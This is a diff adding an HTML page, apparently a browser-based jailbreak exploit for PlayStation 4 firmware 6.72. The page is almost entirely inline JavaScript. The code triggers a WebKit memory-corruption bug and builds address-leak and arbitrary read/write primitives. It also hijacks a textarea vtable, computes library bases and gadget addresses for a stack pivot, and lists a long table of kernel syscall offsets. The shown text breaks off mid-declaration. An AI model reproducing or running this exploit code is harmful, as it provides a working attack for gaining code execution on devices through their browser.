@@ -1,0 +1,699 @@
+<!DOCTYPE html>
+<html manifest="SALT.manifest">
+<html>
+<head>
+ <title>NIGHT KING v5 - 6.72 FW</title>
+ <meta charset="UTF-8" />
+ <link rel="stylesheet" href="icon.css">
+ <link rel="stylesheet" href="materialize.css">
+ <link rel="stylesheet" href="main.css">
+  <script>
+ var leaker_obj={a:0};var leaker_arr=new Uint32Array(6);var oob_slave=new Uint8Array(1024);var oob_master=new Uint32Array(7);var spray=[];function spray_one(){var x=new Uint32Array(1);x[spray.length+'spray']=123;spray.push(x);}for(var i=0;i<0x10000;i++)spray_one();var target={a:2.1100820415101592e-303,b:false,c:true,d:5678};var target2={a:2.1100820415101592e-303,b:false,c:true,e:5678};var impl_idx=0;function create_impl(){var ans={a:target};for(var i=0;i<32;i++)ans[(impl_idx++)+'x']={};return ans;}function trigger(x){if(impl.a!=target){print("wtf?");while(1);}var o={a:1};for(var i in o){{i=x;function i(){};}o[i];}if(impl.a!=target){print("corrupted!");print(typeof(impl.a));print(impl.a.length);target.c=leaker_obj;leaker_obj.a=leaker_obj;var l1=impl.a[4];var l2=impl.a[5];leaker_obj.a=oob_slave;var s1=impl.a[4];var s2=impl.a[5];target.c=leaker_arr;impl.a[4]=l1;impl.a[5]=l2;target.c=oob_master;impl.a[4]=s1;impl.a[5]=s2;impl.a=target;print([l1,l2,s1,s2]);throw"exploit fucking finished";}}try{for(var _=0;_<1024;_++){var impl=create_impl();var s={a:impl};trigger(s);}}catch(e){print("error: "+e);}function i48_put(x,a){a[4]=x|0;a[5]=(x/4294967296)|0;}function i48_get(a){return a[4]+a[5]*4294967296;}function addrof(x){leaker_obj.a=x;return i48_get(leaker_arr);}function fakeobj(x){i48_put(x,leaker_arr);return leaker_obj.a;}function read_mem_setup(p,sz){i48_put(p,oob_master);oob_master[6]=sz;}function read_mem(p,sz){read_mem_setup(p,sz);var arr=[];for(var i=0;i<sz;i++)arr.push(oob_slave[i]);return arr;}function read_mem_s(p,sz){read_mem_setup(p,sz);return""+oob_slave;}function read_mem_b(p,sz){read_mem_setup(p,sz);var b=new Uint8Array(sz);b.set(oob_slave);return b;}function read_mem_as_string(p,sz){var x=read_mem_b(p,sz);var ans='';for(var i=0;i<x.length;i++)ans+=String.fromCharCode(x[i]);return ans;}function write_mem(p,data){i48_put(p,oob_master);oob_master[6]=data.length;for(var i=0;i<data.length;i++)oob_slave[i]=data[i];}function read_ptr_at(p){var ans=0;var d=read_mem(p,8);for(var i=7;i>=0;i--)ans=256*ans+d[i];return ans;}function write_ptr_at(p,d){var arr=[];for(var i=0;i<8;i++){arr.push(d&0xff);d/=256;}write_mem(p,arr);}function hex(x){return(new Number(x)).toString(16);}var malloc_nogc=[];function malloc(sz){var arr=new Uint8Array(sz);malloc_nogc.push(arr);return read_ptr_at(addrof(arr)+0x10);}var tarea=document.createElement('textarea');var real_vt_ptr=read_ptr_at(addrof(tarea)+0x18);var fake_vt_ptr=malloc(0x400);write_mem(fake_vt_ptr,read_mem(real_vt_ptr,0x400));write_ptr_at(addrof(tarea)+0x18,fake_vt_ptr);var real_vtable=read_ptr_at(fake_vt_ptr);var fake_vtable=malloc(0x2000);write_mem(fake_vtable,read_mem(real_vtable,0x2000));write_ptr_at(fake_vt_ptr,fake_vtable);var fake_vt_ptr_bak=malloc(0x400);write_mem(fake_vt_ptr_bak,read_mem(fake_vt_ptr,0x400));var plt_ptr=read_ptr_at(fake_vtable)-10063176;function get_got_addr(idx){var p=plt_ptr+idx*16;var q=read_mem(p,6);if(q[0]!=0xff||q[1]!=0x25)throw"invalid GOT entry";var offset=0;for(var i=5;i>=2;i--)offset=offset*256+q[i];offset+=p+6;return read_ptr_at(offset);}var webkit_base=read_ptr_at(fake_vtable);var libkernel_base=get_got_addr(705)-0x10000;var libc_base=get_got_addr(582);var saveall_addr=libc_base+0x2e2c8;var loadall_addr=libc_base+0x3275c;var setjmp_addr=libc_base+0xbfae0;var longjmp_addr=libc_base+0xbfb30;var pivot_addr=libc_base+0x327d2;var infloop_addr=libc_base+0x447a0;var jop_frame_addr=libc_base+0x715d0;var get_errno_addr_addr=libkernel_base+0x9ff0;var pthread_create_addr=libkernel_base+0xf980;function saveall(){var ans=malloc(0x800);var bak=read_ptr_at(fake_vtable+0x1d8);write_ptr_at(fake_vtable+0x1d8,saveall_addr);tarea.scrollLeft=0;write_mem(ans,read_mem(fake_vt_ptr,0x400));write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,0x400));var bak=read_ptr_at(fake_vtable+0x1d8);write_ptr_at(fake_vtable+0x1d8,saveall_addr);write_ptr_at(fake_vt_ptr+0x38,0x1234);tarea.scrollLeft=0;write_mem(ans+0x400,read_mem(fake_vt_ptr,0x400));write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,0x400));return ans;}function pivot(buf){var ans=malloc(0x400);var bak=read_ptr_at(fake_vtable+0x1d8);write_ptr_at(fake_vtable+0x1d8,saveall_addr);tarea.scrollLeft=0;write_mem(ans,read_mem(fake_vt_ptr,0x400));write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,0x400));var bak=read_ptr_at(fake_vtable+0x1d8);write_ptr_at(fake_vtable+0x1d8,pivot_addr);write_ptr_at(fake_vt_ptr+0x38,buf);write_ptr_at(ans+0x38,read_ptr_at(ans+0x38)-16);write_ptr_at(buf,ans);tarea.scrollLeft=0;write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,0x400));}var sys_670_addr=libkernel_base+0x1efc0;var sys_192_addr=libkernel_base+0x1efe0;var sys_586_addr=libkernel_base+0x1f000;var sys_545_addr=libkernel_base+0x1f020;var sys_362_addr=libkernel_base+0x1f040;var sys_363_addr=libkernel_base+0x1f060;var sys_206_addr=libkernel_base+0x1f080;var sys_5_addr=libkernel_base+0x1f0a0;var sys_432_addr=libkernel_base+0x1f0c0;var sys_136_addr=libkernel_base+0x1f0e0;var sys_42_addr=libkernel_base+0x1f100;var sys_188_addr=libkernel_base+0x1f130;var sys_4_addr=libkernel_base+0x1f150;var sys_546_addr=libkernel_base+0x1f170;var sys_236_addr=libkernel_base+0x1f190;var sys_127_addr=libkernel_base+0x1f1b0;var sys_533_addr=libkernel_base+0x1f1d0;var sys_429_addr=libkernel_base+0x1f1f0;var sys_658_addr=libkernel_base+0x1f210;var sys_345_addr=libkernel_base+0x1f230;var sys_623_addr=libkernel_base+0x1f250;var sys_329_addr=libkernel_base+0x1f270;var sys_551_addr=libkernel_base+0x1f290;var sys_593_addr=libkernel_base+0x1f2b0;var sys_555_addr=libkernel_base+0x1f2e0;var sys_673_addr=libkernel_base+0x1f300;var sys_253_addr=libkernel_base+0x1f320;var sys_272_addr=libkernel_base+0x1f340;var sys_466_addr=libkernel_base+0x1f360;var sys_539_addr=libkernel_base+0x1f380;var sys_454_addr=libkernel_base+0x1f3a0;var sys_33_addr=libkernel_base+0x1f3c0;var sys_55_addr=libkernel_base+0x1f3e0;var sys_53_addr=libkernel_base+0x1f400;var sys_421_addr=libkernel_base+0x1f424;var sys_73_addr=libkernel_base+0x1f450;var sys_23_addr=libkernel_base+0x1f470;var sys_543_addr=libkernel_base+0x1f490;var sys_422_addr=libkernel_base+0x1f4b0;var sys_592_addr=libkernel_base+0x1f4d0;var sys_147_addr=libkernel_base+0x1f4f0;var sys_397_addr=libkernel_base+0x1f510;var sys_663_addr=libkernel_base+0x1f530;var sys_30_addr=libkernel_base+0x1f550;var sys_637_addr=libkernel_base+0x1f570;var sys_616_addr=libkernel_base+0x1f590;var sys_671_addr=libkernel_base+0x1f5b0;var sys_341_addr=libkernel_base+0x1f5d0;var sys_479_addr=libkernel_base+0x1f5f0;var sys_95_addr=libkernel_base+0x1f610;var sys_59_addr=libkernel_base+0x1f63d;var sys_540_addr=libkernel_base+0x1f660;var sys_101_addr=libkernel_base+0x1f680;var sys_655_addr=libkernel_base+0x1f6a0;var sys_549_addr=libkernel_base+0x1f6c0;var sys_49_addr=libkernel_base+0x1f6e0;var sys_78_addr=libkernel_base+0x1f700;var sys_134_addr=libkernel_base+0x1f720;var sys_44_addr=libkernel_base+0x1f740;var sys_289_addr=libkernel_base+0x1f760;var sys_25_addr=libkernel_base+0x1f780;var sys_643_addr=libkernel_base+0x1f7a0;var sys_456_addr=libkernel_base+0x1f7c0;var sys_664_addr=libkernel_base+0x1f7e0;var sys_607_addr=libkernel_base+0x1f800;var sys_563_addr=libkernel_base+0x1f820;var sys_662_addr=libkernel_base+0x1f840;var sys_251_addr=libkernel_base+0x1f869;var sys_1_addr=libkernel_base+0x1f88a;var sys_657_addr=libkernel_base+0x1f8b0;var sys_343_addr=libkernel_base+0x1f8d0;var sys_238_addr=libkernel_base+0x1f8f0;var sys_566_addr=libkernel_base+0x1f910;var sys_402_addr=libkernel_base+0x1f930;var sys_328_addr=libkernel_base+0x1f950;var sys_423_addr=libkernel_base+0x1f970;var sys_567_addr=libkernel_base+0x1f990;var sys_610_addr=libkernel_base+0x1f9b0;var sys_65_addr=libkernel_base+0x1f9d0;var sys_346_addr=libkernel_base+0x1f9f0;var sys_190_addr=libkernel_base+0x1fa10;var sys_619_addr=libkernel_base+0x1fa30;var sys_538_addr=libkernel_base+0x1fa50;var sys_75_addr=libkernel_base+0x1fa70;var sys_487_addr=libkernel_base+0x1fa90;var sys_544_addr=libkernel_base+0x1fab0;var sys_50_addr=libkernel_base+0x1fad0;var sys_404_addr=libkernel_base+0x1fb00;var sys_564_addr=libkernel_base+0x1fb20;var sys_558_addr=libkernel_base+0x1fb40;var sys_116_addr=libkernel_base+0x1fb60;var sys_3_addr=libkernel_base+0x1fb80;var sys_634_addr=libkernel_base+0x1fba0;var sys_548_addr=libkernel_base+0x1fbc0;var sys_165_addr=libkernel_base+0x1fbe0;var sys_638_addr=libkernel_base+0x1fc00;var sys_541_addr=libkernel_base+0x1fc20;var sys_195_addr=libkernel_base+0x1fc40;var sys_31_addr=libkernel_base+0x1fc60;var sys_665_addr=libkernel_base+0x1fc80;var sys_478_addr=libkernel_base+0x1fca0;var sys_98_addr=libkernel_base+0x1fcc0;var sys_29_addr=libkernel_base+0x1fce0;var sys_194_addr=libkernel_base+0x1fd00;var sys_656_addr=libkernel_base+0x1fd20;var sys_632_addr=libkernel_base+0x1fd40;var sys_454_addr=libkernel_base+0x1fd60;var sys_37_addr=libkernel_base+0x1fd70;var sys_599_addr=libkernel_base+0x1fd90;var sys_32_addr=libkernel_base+0x1fdb0;var sys_554_addr=libkernel_base+0x1fdd0;var sys_59_addr=libkernel_base+0x1fdf0;var sys_131_addr=libkernel_base+0x1fe10;var sys_417_addr=libkernel_base+0x1fe30;var sys_547_addr=libkernel_base+0x1fe50;var sys_476_addr=libkernel_base+0x1fe70;var sys_642_addr=libkernel_base+0x1fe90;var sys_407_addr=libkernel_base+0x1feb0;var sys_393_addr=libkernel_base+0x1fed0;var sys_113_addr=libkernel_base+0x1fef0;var sys_10_addr=libkernel_base+0x1ff10;var sys_633_addr=libkernel_base+0x1ff30;var sys_535_addr=libkernel_base+0x1ff50;var sys_488_addr=libkernel_base+0x1ff70;var sys_232_addr=libkernel_base+0x1ff90;var sys_481_addr=libkernel_base+0x1ffb0;var sys_636_addr=libkernel_base+0x1ffd0;var sys_93_addr=libkernel_base+0x1fff0;var sys_522_addr=libkernel_base+0x20010;var sys_36_addr=libkernel_base+0x20030;var sys_135_addr=libkernel_base+0x20050;var sys_646_addr=libkernel_base+0x20070;var sys_674_addr=libkernel_base+0x20090;var sys_629_addr=libkernel_base+0x200b0;var sys_24_addr=libkernel_base+0x200d0;var sys_56_addr=libkernel_base+0x200f0;var sys_340_addr=libkernel_base+0x20113;var sys_182_addr=libkernel_base+0x201a0;var sys_486_addr=libkernel_base+0x201c0;var sys_542_addr=libkernel_base+0x201e0;var sys_332_addr=libkernel_base+0x20200;var sys_416_addr=libkernel_base+0x20220;var sys_622_addr=libkernel_base+0x20240;var sys_669_addr=libkernel_base+0x20260;var sys_620_addr=libkernel_base+0x20280;var sys_122_addr=libkernel_base+0x202a0;var sys_27_addr=libkernel_base+0x202c0;var sys_661_addr=libkernel_base+0x202e0;var sys_80_addr=libkernel_base+0x20300;var sys_666_addr=libkernel_base+0x20320;var sys_240_addr=libkernel_base+0x20340;var sys_654_addr=libkernel_base+0x20360;var sys_430_addr=libkernel_base+0x20380;var sys_325_addr=libkernel_base+0x203a0;var sys_608_addr=libkernel_base+0x203c0;var sys_290_addr=libkernel_base+0x203e0;var sys_588_addr=libkernel_base+0x20400;var sys_532_addr=libkernel_base+0x20420;var sys_79_addr=libkernel_base+0x20440;var sys_552_addr=libkernel_base+0x20460;var sys_550_addr=libkernel_base+0x20480;var sys_649_addr=libkernel_base+0x204a0;var sys_560_addr=libkernel_base+0x204c0;var sys_628_addr=libkernel_base+0x204e0;var sys_444_addr=libkernel_base+0x20500;var sys_74_addr=libkernel_base+0x20520;var sys_403_addr=libkernel_base+0x205f0;var sys_400_addr=libkernel_base+0x20610;var sys_334_addr=libkernel_base+0x20630;var sys_86_addr=libkernel_base+0x20650;var sys_20_addr=libkernel_base+0x20670;var sys_102_addr=libkernel_base+0x20690;var sys_627_addr=libkernel_base+0x206b0;var sys_581_addr=libkernel_base+0x206d0;var sys_602_addr=libkernel_base+0x206f0;var sys_534_addr=libkernel_base+0x20710;var sys_183_addr=libkernel_base+0x20730;var sys_640_addr=libkernel_base+0x20750;var sys_234_addr=libkernel_base+0x20770;var sys_83_addr=libkernel_base+0x20790;var sys_431_addr=libkernel_base+0x207b0;var sys_600_addr=libkernel_base+0x207d0;var sys_433_addr=libkernel_base+0x207f0;var sys_1_addr=libkernel_base+0x20810;var sys_90_addr=libkernel_base+0x20830;var sys_138_addr=libkernel_base+0x20850;var sys_475_addr=libkernel_base+0x20870;var sys_536_addr=libkernel_base+0x20890;var sys_237_addr=libkernel_base+0x208b0;var sys_327_addr=libkernel_base+0x208d0;var sys_668_addr=libkernel_base+0x208f0;var sys_553_addr=libkernel_base+0x20910;var sys_672_addr=libkernel_base+0x20930;var sys_612_addr=libkernel_base+0x20950;var sys_47_addr=libkernel_base+0x20970;var sys_189_addr=libkernel_base+0x20990;var sys_2_addr=libkernel_base+0x209b0;var sys_557_addr=libkernel_base+0x209d0;var sys_565_addr=libkernel_base+0x209f0;var sys_613_addr=libkernel_base+0x20a10;var sys_196_addr=libkernel_base+0x20a30;var sys_117_addr=libkernel_base+0x20a50;var sys_126_addr=libkernel_base+0x20a70;var sys_7_addr=libkernel_base+0x20a90;var sys_202_addr=libkernel_base+0x20ab0;var sys_104_addr=libkernel_base+0x20ad0;var sys_331_addr=libkernel_base+0x20af0;var sys_604_addr=libkernel_base+0x20b10;var sys_615_addr=libkernel_base+0x20b30;var sys_105_addr=libkernel_base+0x20b50;var sys_594_addr=libkernel_base+0x20b70;var sys_100_addr=libkernel_base+0x20b90;var sys_677_addr=libkernel_base+0x20bb0;var sys_625_addr=libkernel_base+0x20bd0;var sys_596_addr=libkernel_base+0x20bf0;var sys_99_addr=libkernel_base+0x20c10;var sys_401_addr=libkernel_base+0x20c30;var sys_125_addr=libkernel_base+0x20c50;var sys_15_addr=libkernel_base+0x20c70;var sys_315_addr=libkernel_base+0x20c90;var sys_441_addr=libkernel_base+0x20cb0;var sys_591_addr=libkernel_base+0x20cd0;var sys_618_addr=libkernel_base+0x20cf0;var sys_556_addr=libkernel_base+0x20d10;var sys_121_addr=libkernel_base+0x20d30;var sys_239_addr=libkernel_base+0x20d50;var sys_137_addr=libkernel_base+0x20d70;var sys_333_addr=libkernel_base+0x20d90;var sys_595_addr=libkernel_base+0x20db0;var sys_464_addr=libkernel_base+0x20dd0;var sys_324_addr=libkernel_base+0x20df0;var sys_499_addr=libkernel_base+0x20e10;var sys_583_addr=libkernel_base+0x20e30;var sys_340_addr=libkernel_base+0x20e50;var sys_12_addr=libkernel_base+0x20e70;var sys_630_addr=libkernel_base+0x20e90;var sys_379_addr=libkernel_base+0x20eb0;var sys_443_addr=libkernel_base+0x20ed0;var sys_653_addr=libkernel_base+0x20ef0;var sys_455_addr=libkernel_base+0x20f10;var sys_204_addr=libkernel_base+0x20f30;var sys_35_addr=libkernel_base+0x20f50;var sys_480_addr=libkernel_base+0x20f70;var sys_128_addr=libkernel_base+0x20f90;var sys_209_addr=libkernel_base+0x20fb0;var sys_582_addr=libkernel_base+0x20fd0;var sys_310_addr=libkernel_base+0x20ff0;var sys_572_addr=libkernel_base+0x21010;var sys_124_addr=libkernel_base+0x21030;var sys_435_addr=libkernel_base+0x21050;var sys_477_addr=libkernel_base+0x21070;var sys_235_addr=libkernel_base+0x21090;var sys_41_addr=libkernel_base+0x210b0;var sys_28_addr=libkernel_base+0x210d0;var sys_6_addr=libkernel_base+0x210f0;var sys_606_addr=libkernel_base+0x21110;var sys_43_addr=libkernel_base+0x21130;var sys_624_addr=libkernel_base+0x21150;var sys_598_addr=libkernel_base+0x21170;var sys_92_addr=libkernel_base+0x21190;var sys_39_addr=libkernel_base+0x211b0;var sys_120_addr=libkernel_base+0x211d0;var sys_603_addr=libkernel_base+0x211f0;var sys_106_addr=libkernel_base+0x21210;var sys_648_addr=libkernel_base+0x21230;var sys_617_addr=libkernel_base+0x21250;var sys_406_addr=libkernel_base+0x21270;var sys_641_addr=libkernel_base+0x21290;var sys_483_addr=libkernel_base+0x212b0;var sys_675_addr=libkernel_base+0x212d0;var sys_660_addr=libkernel_base+0x212f0;var sys_203_addr=libkernel_base+0x21310;var sys_605_addr=libkernel_base+0x21330;var sys_647_addr=libkernel_base+0x21350;var sys_233_addr=libkernel_base+0x21370;var sys_408_addr=libkernel_base+0x21390;var sys_405_addr=libkernel_base+0x213b0;var sys_635_addr=libkernel_base+0x213d0;var sys_667_addr=libkernel_base+0x213f0;var sys_89_addr=libkernel_base+0x21410;var sys_34_addr=libkernel_base+0x21430;var sys_482_addr=libkernel_base+0x21450;var sys_584_addr=libkernel_base+0x21470;var sys_659_addr=libkernel_base+0x21490;var sys_114_addr=libkernel_base+0x214b0;var sys_330_addr=libkernel_base+0x214d0;var sys_191_addr=libkernel_base+0x214f0;var sys_639_addr=libkernel_base+0x21510;var sys_96_addr=libkernel_base+0x21530;var sys_676_addr=libkernel_base+0x21550;var sys_652_addr=libkernel_base+0x21570;var sys_54_addr=libkernel_base+0x21590;var sys_626_addr=libkernel_base+0x215b0;var sys_580_addr=libkernel_base+0x215d0;var sys_97_addr=libkernel_base+0x215f0;var sys_434_addr=libkernel_base+0x21610;var sys_442_addr=libkernel_base+0x21630;var sys_585_addr=libkernel_base+0x21650;var sys_587_addr=libkernel_base+0x21670;var sys_601_addr=libkernel_base+0x21690;var sys_118_addr=libkernel_base+0x216b0;var sys_611_addr=libkernel_base+0x216d0;var sys_140_addr=libkernel_base+0x216f0;var sys_141_addr=libkernel_base+0x21710;var sys_392_addr=libkernel_base+0x21730;var sys_559_addr=libkernel_base+0x21750;var sys_133_addr=libkernel_base+0x21770;var aio_init_addr=sys_670_addr;var fpathconf_addr=sys_192_addr;var dmem_container_addr=sys_586_addr;var evf_clear_addr=sys_545_addr;var kqueue_addr=sys_362_addr;var kevent_addr=sys_363_addr;var futimes_addr=sys_206_addr;var open_addr=sys_5_addr;var thr_self_addr=sys_432_addr;var mkdir_addr=sys_136_addr;var pipe_addr=sys_42_addr;var stat_addr=sys_188_addr;var write_addr=sys_4_addr;var evf_cancel_addr=sys_546_addr;var ktimer_delete_addr=sys_236_addr;var setregid_addr=sys_127_addr;var jitshm_create_addr=sys_533_addr;var sigwait_addr=sys_429_addr;var fdatasync_addr=sys_658_addr;var sigtimedwait_addr=sys_345_addr;var get_gpo_addr=sys_623_addr;var sched_setscheduler_addr=sys_329_addr;var osem_open_addr=sys_551_addr;var dynlib_get_info_addr=sys_593_addr;var osem_post_addr=sys_555_addr;var blockpool_move_addr=sys_673_addr;var issetugid_addr=sys_253_addr;var getdents_addr=sys_272_addr;var rtprio_thread_addr=sys_466_addr;var evf_delete_addr=sys_539_addr;var _umtx_op_addr=sys_454_addr;var access_addr=sys_33_addr;var reboot_addr=sys_55_addr;var sigaltstack_addr=sys_53_addr;var getcontext_addr=sys_421_addr;var munmap_addr=sys_73_addr;var setuid_addr=sys_23_addr;var evf_trywait_addr=sys_543_addr;var setcontext_addr=sys_422_addr;var dynlib_get_list_addr=sys_592_addr;var setsid_addr=sys_147_addr;var fstatfs_addr=sys_397_addr;var aio_multi_wait_addr=sys_663_addr;var accept_addr=sys_30_addr;var set_phys_fmem_limit_addr=sys_637_addr;var thr_get_name_addr=sys_616_addr;var get_page_table_stats_addr=sys_671_addr;var sigsuspend_addr=sys_341_addr;var truncate_addr=sys_479_addr;var fsync_addr=sys_95_addr;var execve_addr=sys_59_addr;var evf_open_addr=sys_540_addr;var netabort_addr=sys_101_addr;var blockpool_unmap_addr=sys_655_addr;var osem_create_addr=sys_549_addr;var getlogin_addr=sys_49_addr;var mincore_addr=sys_78_addr;var shutdown_addr=sys_134_addr;var profil_addr=sys_44_addr;var preadv_addr=sys_289_addr;var geteuid_addr=sys_25_addr;var set_chicken_switches_addr=sys_643_addr;var sigqueue_addr=sys_456_addr;var aio_multi_poll_addr=sys_664_addr;var get_self_auth_info_addr=sys_607_addr;var opmc_enable_addr=sys_563_addr;var aio_multi_delete_addr=sys_662_addr;var rfork_addr=sys_251_addr;var sys_exit_addr=sys_1_addr;var blockpool_batch_addr=sys_657_addr;var sigpending_addr=sys_343_addr;var ktimer_gettime_addr=sys_238_addr;var opmc_set_ctr_addr=sys_566_addr;var ksem_wait_addr=sys_402_addr;var sched_getparam_addr=sys_328_addr;var swapcontext_addr=sys_423_addr;var opmc_get_ctr_addr=sys_567_addr;var budget_get_ptype_addr=sys_610_addr;var msync_addr=sys_65_addr;var sigwaitinfo_addr=sys_346_addr;var lstat_addr=sys_190_addr;var test_debug_rwmem_addr=sys_619_addr;var evf_create_addr=sys_538_addr;var madvise_addr=sys_75_addr;var cpuset_getaffinity_addr=sys_487_addr;var evf_set_addr=sys_544_addr;var setlogin_addr=sys_50_addr;var ksem_init_addr=sys_404_addr;var code_source="leeful";var opmc_disable_addr=sys_564_addr;var namedobj_delete_addr=sys_558_addr;var gettimeofday_addr=sys_116_addr;var read_addr=sys_3_addr;var thr_get_ucontext_addr=sys_634_addr;var batch_map_addr=sys_548_addr;var sysarch_addr=sys_165_addr;var utc_to_localtime_addr=sys_638_addr;var evf_close_addr=sys_541_addr;var setrlimit_addr=sys_195_addr;var getpeername_addr=sys_31_addr;var aio_get_data_addr=sys_665_addr;var lseek_addr=sys_478_addr;var connect_addr=sys_98_addr;var recvfrom_addr=sys_29_addr;var getrlimit_addr=sys_194_addr;var dynlib_get_info_for_libdbg_addr=sys_656_addr;var thr_suspend_ucontext_addr=sys_632_addr;var _umtx_op_addr=sys_454_addr;var kill_addr=sys_37_addr;var dynlib_process_needed_and_relocate_addr=sys_599_addr;var getsockname_addr=sys_32_addr;var osem_trywait_addr=sys_554_addr;var execve_addr=sys_59_addr;var flock_addr=sys_131_addr;var sigreturn_addr=sys_417_addr;var query_memory_protection_addr=sys_547_addr;var pwrite_addr=sys_476_addr;var get_map_statistics_addr=sys_642_addr;var ksem_getvalue_addr=sys_407_addr;var sendfile_addr=sys_393_addr;var socketex_addr=sys_113_addr;var unlink_addr=sys_10_addr;var thr_resume_ucontext_addr=sys_633_addr;var dl_get_list_addr=sys_535_addr;var cpuset_setaffinity_addr=sys_488_addr;var clock_gettime_addr=sys_232_addr;var thr_kill2_addr=sys_481_addr;var set_timezone_info_addr=sys_636_addr;var select_addr=sys_93_addr;var pselect_addr=sys_522_addr;var sync_addr=sys_36_addr;var socketpair_addr=sys_135_addr;var get_kernel_mem_statistics_addr=sys_646_addr;var virtual_query_all_addr=sys_674_addr;var physhm_open_addr=sys_629_addr;var getuid_addr=sys_24_addr;var revoke_addr=sys_56_addr;var sigprocmask_addr=sys_340_addr;var setegid_addr=sys_182_addr;var cpuset_getid_addr=sys_486_addr;var evf_wait_addr=sys_542_addr;var sched_get_priority_max_addr=sys_332_addr;var sigaction_addr=sys_416_addr;var ipmimgr_call_addr=sys_622_addr;var aio_submit_cmd_addr=sys_669_addr;var free_stack_addr=sys_620_addr;var settimeofday_addr=sys_122_addr;var recvmsg_addr=sys_27_addr;var aio_submit_addr=sys_661_addr;var setgroups_addr=sys_80_addr;var aio_multi_cancel_addr=sys_666_addr;var nanosleep_addr=sys_240_addr;var blockpool_map_addr=sys_654_addr;var thr_create_addr=sys_430_addr;var munlockall_addr=sys_325_addr;var dynlib_get_info_ex_addr=sys_608_addr;var pwritev_addr=sys_290_addr;var mname_addr=sys_588_addr;var regmgr_call_addr=sys_532_addr;var getgroups_addr=sys_79_addr;var osem_close_addr=sys_552_addr;var osem_delete_addr=sys_550_addr;var dynlib_get_obj_member_addr=sys_649_addr;var debug_init_addr=sys_560_addr;var mmap_dmem_addr=sys_628_addr;var kldunloadf_addr=sys_444_addr;var mprotect_addr=sys_74_addr;var ksem_trywait_addr=sys_403_addr;var ksem_close_addr=sys_400_addr;var sched_rr_get_interval_addr=sys_334_addr;var getitimer_addr=sys_86_addr;var getpid_addr=sys_20_addr;var netgetsockinfo_addr=sys_102_addr;var get_cpu_usage_all_addr=sys_627_addr;var eport_delete_addr=sys_581_addr;var randomized_path_addr=sys_602_addr;var jitshm_alias_addr=sys_534_addr;var seteuid_addr=sys_183_addr;var set_uevt_addr=sys_640_addr;var clock_getres_addr=sys_234_addr;var setitimer_addr=sys_83_addr;var thr_exit_addr=sys_431_addr;var sandbox_path_addr=sys_600_addr;var thr_kill_addr=sys_433_addr;var sys_exit_addr=sys_1_addr;var dup2_addr=sys_90_addr;var utimes_addr=sys_138_addr;var pread_addr=sys_475_addr;var dl_get_info_addr=sys_536_addr;var ktimer_settime_addr=sys_237_addr;var sched_setparam_addr=sys_327_addr;var aio_create_addr=sys_668_addr;var osem_wait_addr=sys_553_addr;var dynlib_get_list_for_libdbg_addr=sys_672_addr;var get_proc_type_info_addr=sys_612_addr;var getgid_addr=sys_47_addr;var fstat_addr=sys_189_addr;var fork_addr=sys_2_addr;var namedobj_create_addr=sys_557_addr;var opmc_set_ctl_addr=sys_565_addr;var get_resident_count_addr=sys_613_addr;var getdirentries_addr=sys_196_addr;var getrusage_addr=sys_117_addr;var setreuid_addr=sys_126_addr;var wait4_addr=sys_7_addr;var __sysctl_addr=sys_202_addr;var bind_addr=sys_104_addr;var sched_yield_addr=sys_331_addr;var dl_get_metadata_addr=sys_604_addr;var get_resident_fmem_count_addr=sys_615_addr;var setsockopt_addr=sys_105_addr;var dynlib_load_prx_addr=sys_594_addr;var getpriority_addr=sys_100_addr;var get_phys_page_size_addr=sys_677_addr;var opmc_set_hw_addr=sys_625_addr;var dynlib_do_copy_relocations_addr=sys_596_addr;var netcontrol_addr=sys_99_addr;var ksem_post_addr=sys_401_addr;var netgetiflist_addr=sys_125_addr;var chmod_addr=sys_15_addr;var aio_suspend_addr=sys_315_addr;var ksem_timedwait_addr=sys_441_addr;var dynlib_dlsym_addr=sys_591_addr;var get_paging_stats_of_all_objects_addr=sys_618_addr;var osem_cancel_addr=sys_556_addr;var writev_addr=sys_121_addr;var ktimer_getoverrun_addr=sys_239_addr;var rmdir_addr=sys_137_addr;var sched_get_priority_min_addr=sys_333_addr;var dynlib_unload_prx_addr=sys_595_addr;var thr_set_name_addr=sys_464_addr;var mlockall_addr=sys_324_addr;var openat_addr=sys_499_addr;var eport_open_addr=sys_583_addr;var sigprocmask_addr=sys_340_addr;var chdir_addr=sys_12_addr;var physhm_unlink_addr=sys_630_addr;var mtypeprotect_addr=sys_379_addr;var thr_wake_addr=sys_443_addr;var blockpool_open_addr=sys_653_addr;var thr_new_addr=sys_455_addr;var munlock_addr=sys_204_addr;var fchflags_addr=sys_35_addr;var ftruncate_addr=sys_480_addr;var rename_addr=sys_128_addr;var poll_addr=sys_209_addr;var eport_trigger_addr=sys_582_addr;var getsid_addr=sys_310_addr;var virtual_query_addr=sys_572_addr;var fchmod_addr=sys_124_addr;var _umtx_unlock_addr=sys_435_addr;var mmap_addr=sys_477_addr;var ktimer_create_addr=sys_235_addr;var dup_addr=sys_41_addr;var sendmsg_addr=sys_28_addr;var close_addr=sys_6_addr;var is_development_mode_addr=sys_606_addr;var getegid_addr=sys_43_addr;var get_vm_map_timestamp_addr=sys_624_addr;var dynlib_get_proc_param_addr=sys_598_addr;var fcntl_addr=sys_92_addr;var getppid_addr=sys_39_addr;var readv_addr=sys_120_addr;var rdup_addr=sys_603_addr;var listen_addr=sys_106_addr;var app_state_change_addr=sys_648_addr;var set_gpo_addr=sys_617_addr;var ksem_unlink_addr=sys_406_addr;var get_cpu_usage_proc_addr=sys_641_addr;var shm_unlink_addr=sys_483_addr;var reserve_2mb_page_addr=sys_675_addr;var dynlib_get_info2_addr=sys_660_addr;var mlock_addr=sys_203_addr;var workaround8849_addr=sys_605_addr;var get_sdk_compiled_version_addr=sys_647_addr;var clock_settime_addr=sys_233_addr;var ksem_destroy_addr=sys_408_addr;var ksem_open_addr=sys_405_addr;var thr_set_ucontext_addr=sys_635_addr;var get_bio_usage_all_addr=sys_667_addr;var getdtablesize_addr=sys_89_addr;var chflags_addr=sys_34_addr;var shm_open_addr=sys_482_addr;var eport_close_addr=sys_584_addr;var dynlib_get_list2_addr=sys_659_addr;var socketclose_addr=sys_114_addr;var sched_getscheduler_addr=sys_330_addr;var pathconf_addr=sys_191_addr;var localtime_to_utc_addr=sys_639_addr;var setpriority_addr=sys_96_addr;var cpumode_yield_addr=sys_676_addr;var process_terminate_addr=sys_652_addr;var ioctl_addr=sys_54_addr;var opmc_get_hw_addr=sys_626_addr;var 